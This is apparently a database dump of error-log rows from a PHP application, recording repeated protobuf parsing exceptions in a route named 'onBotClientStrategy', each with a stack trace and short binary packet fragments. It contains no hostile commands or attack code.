(43, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:50:29'),
(44, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:50:30'),
(45, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:50:31'),
(46, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:50:32'),
(47, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:50:33'),
(48, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'l\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'l\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'l\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:50:54'),
(49, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'I\\xEC\\x8B\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'I\\xEC\\x8B\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'I\\xEC\\x8B\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:50:58'),
(50, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'I\\xEC\\x8B\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'I\\xEC\\x8B\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'I\\xEC\\x8B\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:51:01'),
(51, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'|m\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'|m\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'|m\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:51:25'),
(52, 'Router', 'onBotClientStrategy (exception)', 'Exception: Expected type:0 but had  in /var/www/html/application/modules/protobuf/message/pb_message.php:221\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x08\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x08\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x08\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:52:09'),
(53, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'G\\xCE\\xDB\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'G\\xCE\\xDB\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'G\\xCE\\xDB\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:52:42'),
(54, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'i\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'i\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'i\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:52:45'),
(55, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:6 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'v\\xA9\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'v\\xA9\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'v\\xA9\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:54:27'),
(56, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\',\\xDA\\x81\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\',\\xDA\\x81\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\',\\xDA\\x81\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:55:17'),
(57, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xD9>\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xD9>\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xD9>\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:55:24'),
(58, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xF03^\\xB4\\xFE\\x9DW\\x1AL\\xA1\\xBE\\xA1\\xE7*\\xF7...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xF03^\\xB4\\xFE\\x9DW\\x1AL\\xA1\\xBE\\xA1\\xE7*\\xF7...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xF03^\\xB4\\xFE\\x9DW\\x1AL\\xA1\\xBE\\xA1\\xE7*\\xF7...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:56:53'),
(59, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xF1B\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xF1B\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xF1B\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:56:54'),
(60, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:6 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'.\\xDA\\xBD\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'.\\xDA\\xBD\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'.\\xDA\\xBD\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:56:55'),
(61, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'_NW\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'_NW\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'_NW\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:56:58'),
(62, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'I\\xD22\\x9E\\x84\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'I\\xD22\\x9E\\x84\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'I\\xD22\\x9E\\x84\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:56:59'),
(63, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:3 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x93\\xEA\\xD2\\xFA\\x84{\\x9C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x93\\xEA\\xD2\\xFA\\x84{\\x9C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x93\\xEA\\xD2\\xFA\\x84{\\x9C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:57:17'),
(64, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x95\\x04\\xB3\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x95\\x04\\xB3\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x95\\x04\\xB3\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:57:51'),
(65, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xD7S\\x8A\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xD7S\\x8A\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xD7S\\x8A\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:57:52'),
(66, 'Router', 'onBotClientStrategy (exception)', 'Exception: Expected type:3 but had  in /var/www/html/application/modules/protobuf/message/pb_message.php:221\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x13O\\xC2\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x13O\\xC2\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x13O\\xC2\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:57:58'),
(67, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:3 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xF3\\xC0,\\x8B\\xFBn\\xC6\\x84\\xC6\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xF3\\xC0,\\x8B\\xFBn\\xC6\\x84\\xC6\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xF3\\xC0,\\x8B\\xFBn\\xC6\\x84\\xC6\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:58:27'),
(68, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\',\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\',\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\',\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:58:46'),
(69, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'g\\x0E\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'g\\x0E\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'g\\x0E\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:59:03'),
(70, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'g\\x0E\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'g\\x0E\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'g\\x0E\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 04:59:06'),
(71, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x87\\xBBv\\xC9$\\xBE\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x87\\xBBv\\xC9$\\xBE\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x87\\xBBv\\xC9$\\xBE\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 05:00:11'),
(72, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x87\\xBBv\\xC9$\\xBE\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x87\\xBBv\\xC9$\\xBE\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x87\\xBBv\\xC9$\\xBE\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 05:00:12'),
(73, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:6 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'V\\f\\xEB\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'V\\f\\xEB\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'V\\f\\xEB\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 05:01:04'),
(74, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:6 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'V\\f\\xEB\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'V\\f\\xEB\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'V\\f\\xEB\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-10 05:01:05'),
